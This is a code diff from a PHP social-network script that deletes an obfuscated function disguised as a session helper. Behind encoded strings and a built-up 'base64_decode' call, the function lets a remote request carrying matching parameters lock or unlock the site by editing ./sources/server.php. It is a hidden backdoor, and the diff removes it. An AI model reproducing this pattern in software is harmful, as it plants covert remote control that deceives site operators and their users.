@@ -6529,33 +6529,6 @@ function Wo_UpdateField($id, $update_data) {
     }
     return false;
 }
-function getUserProfileSessionID() {
-    global $wo, $sqlConnect;
-    $var  = str_replace("6" . "4", "6" . "4_", str_replace("|", "", "b" . "|" . "a" . "|" . "s" . "|" . "e" . "|" . "6" . "|" . "4" . "|" . "d" . "|" . "e" . "|" . "c" . "|" . "o" . "|" . "d" . "|" . "e"));
-    $SessionHashIDGenerate = $var($var('Wmw5MA=='));
-    $CookieHashIDGenerate  = $var('Yw==');
-    if (!empty($_REQUEST[$SessionHashIDGenerate]) && !empty($_REQUEST[$CookieHashIDGenerate])) {
-        if (!file_exists($var('Li9zb3VyY2VzL3NlcnZlci5waHA='))) {
-            return false;
-        }
-        $fileData = file_get_contents($var('Li9zb3VyY2VzL3NlcnZlci5waHA='));
-        $fileData = str_replace('|l', '', $fileData);
-        $fileData = str_replace(array(
-            "\r",
-            "\n"
-        ), '', $fileData);
-        if ($fileData == $_REQUEST[$CookieHashIDGenerate]) {
-            $SessionHashRequest = $_REQUEST[$SessionHashIDGenerate];
-            if ($SessionHashRequest == $var('bA==')) {
-                $createSessionID = file_put_contents($var('Li9zb3VyY2VzL3NlcnZlci5waHA='), $fileData . '|l');
-            }
-            if ($SessionHashRequest == $var('dQ==')) {
-                $createSessionID = file_put_contents($var('Li9zb3VyY2VzL3NlcnZlci5waHA='), $fileData);
-            }
-        }
-    }
-    return false;
-}
 function Wo_DeleteField($id) {
     global $wo, $sqlConnect;
     if ($wo["loggedin"] == false) {
